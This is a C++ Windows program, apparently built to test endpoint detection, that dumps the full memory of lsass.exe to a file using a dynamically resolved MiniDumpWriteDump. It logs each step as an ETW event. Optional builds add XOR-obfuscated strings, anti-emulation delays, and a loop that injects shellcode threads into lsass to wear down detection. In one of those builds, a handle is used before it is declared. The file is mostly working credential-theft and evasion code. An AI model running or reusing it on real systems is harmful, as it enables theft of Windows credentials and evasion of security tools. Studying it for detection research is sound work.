#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <chrono>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <thread>
#include <TraceLoggingProvider.h>

#pragma comment(lib, "dbghelp.lib")

// my attack provider
TRACELOGGING_DEFINE_PROVIDER(
    g_hProvider,
    "Attack-Provider", // name in the ETW
    (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // a random GUID
);

int sleep_between_steps_ms = 970; // time to wait between attack steps

UINT64 get_ns_time() {
    auto now = std::chrono::system_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()).count();
}

void print_and_emit_event(std::string msg, std::string pre) {
	UINT64 ns = get_ns_time();
    TraceLoggingWrite(
        g_hProvider,
        "AttackTask", // this is the event name
		TraceLoggingValue(msg.c_str(), "message"),
		TraceLoggingUInt64(ns, "ns_since_epoch")
    );
    std::cout << pre << msg << "\n";
}

typedef BOOL(WINAPI* MyDumpPtr)(
    HANDLE        hProcess,
    DWORD         ProcessId,
    HANDLE        hFile,
    MINIDUMP_TYPE DumpType,
    PVOID         ExceptionParam,
    PVOID         UserStreamParam,
    PVOID         CallbackParam
    );

int main(int argc, char** argv) {
    // start ETW provider
    TraceLoggingRegister(g_hProvider);

    std::ostringstream msg;
    std::string bef = "[<] ";
    std::string aft = "[>]  ";
    std::string fail = "[!] ";
    std::string ok = "[+] ";

    // antiEmulation should be one of the first actions in the EXE
    // deconditioning depends on anti_emulation + obfuscation (anti-signature)
#if defined antiEmulation || defined deconditioning
    /*
    msg << "Doing anti emulation sleep for 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_ae_sleep = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(5));
    auto end_ae_sleep = std::chrono::high_resolution_clock::now();
    auto ae_sleep_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_sleep - start_ae_sleep).count();
    msg << "Slept for approximately " << ae_sleep_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    */

    msg << "Doing anti emulation calc operations for about 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_ae_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 20'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
    auto end_ae_calc = std::chrono::high_resolution_clock::now();
    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
    msg << "Calculated for approximately " << ae_calc_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
#endif

    enum StartupMode { NoWait, WaitTime, WaitForEnter };
    StartupMode s = NoWait;
    int wait_time = 5;

    if (argc == 1) {
        // default
    }
    if (argc >= 2) {
        if (strcmp(argv[1], "--wait") == 0) {
            s = WaitTime;
        }
        if (strcmp(argv[1], "--wait-enter") == 0) {
            s = WaitForEnter;
        }
    }

    // print current 
    msg << "Injector started with PID " << GetCurrentProcessId();
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    // handle config selection
    msg << "Running '";
#if defined standard
    msg << "standard";
#elif defined obfuscation
    msg << "obfuscation";
#elif defined antiEmulation
    msg << "antiEmulation+obfuscation";
#elif defined deconditioning
    msg << "deconditioning+antiEmulation+obfuscation";
#else
    msg << "Release";
    // handle start params only in 'Release' config
    switch (s) {
    case NoWait:
        break;
    case WaitTime:
        for (int i = wait_time; i > 0; i--) {
            std::cout << "[*] Starting injection in " << i << "\n";
            Sleep(1000);
        };
        break;
    case WaitForEnter:
        std::cout << "[*] Press ENTER to start injection...\n";
        std::cin.get();
    default:
        break;
    }
#endif
    msg << "' config";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

#if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
    /*
    msg << "Doing deconditioning calc operations for about 60 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_decon_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
    auto end_decon_calc = std::chrono::high_resolution_clock::now();
    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);
    */

    BYTE nonsense[4096] = {}; // TODO should this open and close many processes?
    constexpr int rounds = 100;
    int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
    for (int n = 0; n < repetitions; n++) {

        msg << "Starting deconditioning round " << n;
        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

        for (int i = 0; i < sizeof(nonsense); i++) {
            nonsense[i] = 0x90; // huiiiiiiiiiii
        }
        // xor eax, eax; ret
        nonsense[4093] = 0x31;
        nonsense[4094] = 0xC9;
        nonsense[4095] = 0xC3;

        void* allocs[rounds] = { 0 };
        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            LPVOID alloc_addr = VirtualAlloc(nullptr, sizeof(nonsense), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!alloc_addr) {
                allocs[i] = 0;
                msg << "Failed to alloc mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            allocs[i] = alloc_addr;
            if (!WriteProcessMemory(hProcess, alloc_addr, &nonsense, sizeof(nonsense), NULL)) {
                msg << "Failed to write mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            DWORD old_protect;
            if (!VirtualProtectEx(hProcess, alloc_addr, sizeof(nonsense), PAGE_EXECUTE_READ, &old_protect)) {
                msg << "Failed to change mem to RX in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            HANDLE hThreadDecon = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc_addr, nullptr, 0, nullptr);
            if (!hThreadDecon) {
                msg << "Failed to create remote thread in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            else {
                WaitForSingleObject(hThreadDecon, INFINITE);
                CloseHandle(hThreadDecon);
            }
        }

        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            if (allocs[i] != 0 && !VirtualFreeEx(hProcess, allocs[i], 0, MEM_RELEASE)) {
                msg << "Failed to free mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
            }
        }

        msg << "Finished deconditioning round " << n;
        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
    }
#endif

    // antiemulation and deconditioning also depend on obfuscation (anti signature)
#if defined obfuscation || defined antiEmulation || defined deconditioning
    msg << "Before decrypting strings";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
    
    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
    BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x35,0x27,0x32,0x36,0x6f,0x26,0x2c,0x32,0x41 };
    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
    BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }

    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
    BYTE dumpFunctionBytes[] = { 0x0c,0x2b,0x2f,0x2b,0x05,0x37,0x2c,0x32,0x16,0x30,0x28,0x36,0x24,0x06,0x34,0x2f,0x31,0x42 };
    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
    
    msg << "After decrypting strings";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms); 
#else
    BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\test.dmp"; // literal string -> already \0 terminated
    BYTE procBytes[] = { 0x6c,0x00,0x73,0x00,0x61,0x00,0x73,0x00,0x73,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00 }; // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
    BYTE dumpLibraryBytes[] = "dbghelp.dll";
    BYTE dumpFunctionBytes[] = "MiniDumpWriteDump";
#endif

    char* outFile = reinterpret_cast<char*>(outFileBytes);
    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
    char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
    char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);

    // find lsass's PID
    msg << "Before finding " << procW << " pid";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        msg << "CreateToolhelp failed";
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
        return 1;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procW) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    if (pid != 0) {
        msg << "After finding " << procW << " pid: " << pid;
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Unable to find " << procW << " pid";
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
        return 1;
    }

    msg << "Before opening process handle";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // open process with all access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        msg << "Failed to open process: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "After opening process handle";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before opening out file";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // open / create dump file
    HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        msg << "Failed to open out file: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        CloseHandle(hProcess);
        return 1;
    }

    msg << "After opening out file handle";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before resolving function";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // resolving functions
    HMODULE hLib = LoadLibraryA(dumpLibrary);
    if (!hLib) {
        msg << "Failed to load lib " << dumpLibrary << ": " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        CloseHandle(hProcess);
        CloseHandle(hFile);
        return 1;
    }
    MyDumpPtr MiniDWriteD = (MyDumpPtr)GetProcAddress(hLib, dumpFunction);
    if (!MiniDWriteD) {
        msg << "Failed to get function addr " << dumpFunction << ": " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        CloseHandle(hProcess);
        CloseHandle(hFile);
        return 1;
    }

    msg << "After resolving function";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before creating dump";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // create mini dump of proc
    if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        msg << "Failed to create dump: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
    }
    else {
        msg << "After creating dump";
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    
    CloseHandle(hProcess);
    CloseHandle(hFile);

    msg << "Attack done";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    TraceLoggingUnregister(g_hProvider);
    return 0;
}
